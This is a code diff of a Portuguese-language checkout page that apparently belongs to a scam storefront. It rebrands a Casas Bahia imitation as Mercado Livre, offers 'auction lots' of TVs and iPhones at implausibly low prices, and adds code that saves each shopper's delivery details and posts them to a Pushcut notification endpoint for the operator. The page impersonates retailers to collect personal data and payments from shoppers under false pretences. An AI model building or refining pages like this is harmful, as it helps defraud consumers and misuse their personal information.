@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Entrega - Casas Bahia</title>
+    <title>Entrega - MERCADO LIVRE</title>
     <link rel="stylesheet" href="css/style.css">
     <style>
         .checkout-container {
@@ -15,7 +15,7 @@
         }
 
         .back-link {
-            color: #0759c7;
+            color: #000;
             text-decoration: none;
             font-weight: 600;
             margin-bottom: 20px;
@@ -60,7 +60,7 @@
         }
 
         .step.active .step-number {
-            background: #0759c7;
+            background: #FFE600;
             color: white;
         }
 
@@ -71,7 +71,7 @@
 
         .step-label {
             font-size: 12px;
-            color: #667085;
+            color: #000;
             font-weight: 600;
         }
 
@@ -120,12 +120,12 @@
         .product-price {
             font-size: 20px;
             font-weight: 800;
-            color: #FFE600;
+            color: #000;
         }
 
         .section-title {
             font-size: 12px;
-            color: #0759c7;
+            color: #000;
             font-weight: 800;
             text-transform: uppercase;
             margin-bottom: 10px;
@@ -175,7 +175,7 @@
         .form-group input:focus,
         .form-group select:focus {
             outline: none;
-            border-color: #0759c7;
+            border-color: #FFE600;
             box-shadow: 0 0 0 3px rgba(7, 89, 199, 0.1);
         }
 
@@ -193,7 +193,7 @@
         .btn-continue {
             flex: 1;
             padding: 14px 24px;
-            background: #FFE600;
+            background: #14804a;
             color: white;
             border: none;
             border-radius: 8px;
@@ -204,15 +204,16 @@
         }
 
         .btn-continue:hover {
-            background: #c71c2a;
+            background: #116b3b;
         }
 
         .btn-back {
             flex: 1;
             padding: 14px 24px;
             background: #f3f7fc;
-            color: #0759c7;
-            border: 2px solid #0759c7;
+            color: #fff;
+            background: #c71c2a;
+            border: 2px solid #c71c2a;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 800;
@@ -221,7 +222,8 @@
         }
 
         .btn-back:hover {
-            background: #0759c7;
+            background: #a81822;
+            border-color: #a81822;
             color: white;
         }
 
@@ -270,7 +272,7 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
 
         <div class="nav wrap">
             <a class="brand brand-logo" href="../index.html" aria-label="Ir para página inicial">
-                <img src="https://raw.githubusercontent.com/brunindigital/llbahia/main/ml%20logo.png" alt="Casas Bahia" class="site-logo">
+                <img src="../../ml logo.png" alt="MERCADO LIVRE" class="site-logo">
             </a>
 
             <div class="header-security-right">
@@ -376,12 +378,12 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
 
         // Mock product data
         const products = {
-            '001': { name: 'Smart TV LG 55" 4K UHD', price: 'R$ 300,00', bidPrice: 'R$ 225,00', lote: 'LOTE 001', img: '../images/fotos_bOlVH15ihI5jHajtXlKiAjTHDTTL8yuZiyX3TbKwgTRaci5YautXgzbncWHS.jpg' },
-            '002': { name: 'Smart TV Philco 65" 4K UHD', price: 'R$ 250,00', bidPrice: 'R$ 220,00', lote: 'LOTE 002', img: '../images/xniUpw0EdngD1NG4UEIUzrr9h4pfhVrJbB4yZvWNdk2Rbwk0eLO6cwBRorDQ.jpg' },
+            '001': { name: 'Smart TV LG 55" 4K UHD', price: 'R$ 1.653,64', bidPrice: 'R$ 1.389,00', lote: 'LOTE 001', img: '../images/fotos_bOlVH15ihI5jHajtXlKiAjTHDTTL8yuZiyX3TbKwgTRaci5YautXgzbncWHS.jpg' },
+            '002': { name: 'Smart TV Philco 65" 4K UHD', price: 'R$ 2.700,00', bidPrice: 'R$ 1.917,51', lote: 'LOTE 002', img: '../images/xniUpw0EdngD1NG4UEIUzrr9h4pfhVrJbB4yZvWNdk2Rbwk0eLO6cwBRorDQ.jpg' },
             '003': { name: 'Geladeira LG Frost Free 435L', price: 'R$ 350,00', bidPrice: 'R$ 275,00', lote: 'LOTE 003', img: '../images/img-65628-6a7db8a8032fc.jpg' },
             '004': { name: 'Geladeira Brastemp Frost Free 431L', price: 'R$ 300,00', bidPrice: 'R$ 250,00', lote: 'LOTE 004', img: '../images/img-65644-6a7db9d63fcd5.jpg' },
             '005': { name: 'Lava e seca Hisense', price: 'R$ 200,00', bidPrice: 'R$ 125,00', lote: 'LOTE 005', img: '../images/Captura%20de%20tela%202026-08-20%20155703.png' },
-            '008': { name: 'iPhone 17 Pro Max 512GB', price: 'R$ 380,00', bidPrice: 'R$ 225,00', lote: 'LOTE 008', img: '../images/foto_800100_2026_4_265_514608_0f77a9749ab25c9dabe9edb1b2ace091-1.webp' },
+            '008': { name: 'iPhone 17 Pro Max 512GB', price: 'R$ 3.509,10', bidPrice: 'R$ 2.116,00', lote: 'LOTE 008', img: '../images/foto_800100_2026_4_265_514608_0f77a9749ab25c9dabe9edb1b2ace091-1.webp' },
             '010': { name: 'PlayStation 5 Slim 2TB', price: 'R$ 300,00', bidPrice: 'R$ 250,00', lote: 'LOTE 010', img: '../images/leilao-receita-federal-agosto-2021-5.jpg' },
             '011': { name: 'Air Fryer Mondial 12L', price: 'R$ 290,00', bidPrice: 'R$ 120,00', lote: 'LOTE 011', img: '../images/500ff41d-0aa2-47f4-88c9-a10eb29263be.webp' },
             '012': { name: 'Air Fryer Oven 12L', price: 'R$ 200,00', bidPrice: 'R$ 160,00', lote: 'LOTE 012', img: '../images/iyaal2GtHsEtf41LSnh3TDNo8rGFDFC4EXLBHksmzJPmsBFKPuKvJxwSWjRt.jpg' },
@@ -395,7 +397,7 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
             '073': { name: 'Geladeira Eletrolux Porta Dupla Frost Free Inox', price: 'R$ 350,00', bidPrice: 'R$ 225,00', lote: 'LOTE 073', img: '../images/WhatsApp%20Image%202026-08-24%20at%2000.56.36.jpeg' },
             '120': { name: 'Máquina de Lavar Consul 15kg', price: 'R$ 200,00', bidPrice: 'R$ 150,00', lote: 'LOTE 120', img: '../images/Captura%20de%20tela%202026-08-20%20145211.png' },
             '194': { name: 'iPhone 17 Pro 512GB', price: 'R$ 360,00', bidPrice: 'R$ 225,00', lote: 'LOTE 194', img: '../images/foto-800100-2026-9-198-535306-1a9664e6b4ac5ac0b05d12efd8ca2599-1.webp' },
-            '198': { name: 'iPhone 13 512GB', price: 'R$ 280,00', bidPrice: 'R$ 125,00', lote: 'LOTE 198', img: '../images/ChatGPT-Image-25-de-jun.-de-2026-01_05_07-1290x726.jpg' },
+            '198': { name: 'iPhone 13 512GB', price: 'R$ 920,67', bidPrice: 'R$ 724,52', lote: 'LOTE 198', img: '../images/ChatGPT-Image-25-de-jun.-de-2026-01_05_07-1290x726.jpg' },
             '999': { name: 'Teste Utmify', price: 'R$ 10,00', bidPrice: 'R$ 10,00', lote: 'TESTE', img: '../images/logo.png' },
         };
 
@@ -445,7 +447,7 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
         }
 
         // Form submission
-        document.getElementById('delivery-form').addEventListener('submit', function(e) {
+        document.getElementById('delivery-form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const checkoutData = JSON.parse(sessionStorage.getItem('checkoutData') || '{}');
@@ -462,6 +464,28 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
 
             const fullData = { ...checkoutData, ...deliveryFields, action };
 
+            const clients = JSON.parse(localStorage.getItem('mercadoLivreShippingClients') || '[]');
+            clients.unshift({
+                ...fullData,
+                product_name: products[productId]?.name || productId,
+                submitted_at: new Date().toISOString()
+            });
+            localStorage.setItem('mercadoLivreShippingClients', JSON.stringify(clients));
+
+            try {
+                await fetch('../api/pushcut', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...fullData,
+                        product_id: productId,
+                        product_name: products[productId]?.name || productId
+                    })
+                });
+            } catch (error) {
+                console.error('Pushcut notification failed:', error);
+            }
+
             sessionStorage.setItem('checkoutData', JSON.stringify(fullData));
             sessionStorage.setItem('deliveryData', JSON.stringify(deliveryFields));
 
@@ -474,4 +498,5 @@ src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
     </script>
 
 
+<script src="../js/catalog-overrides.js"></script>
 </body></html>
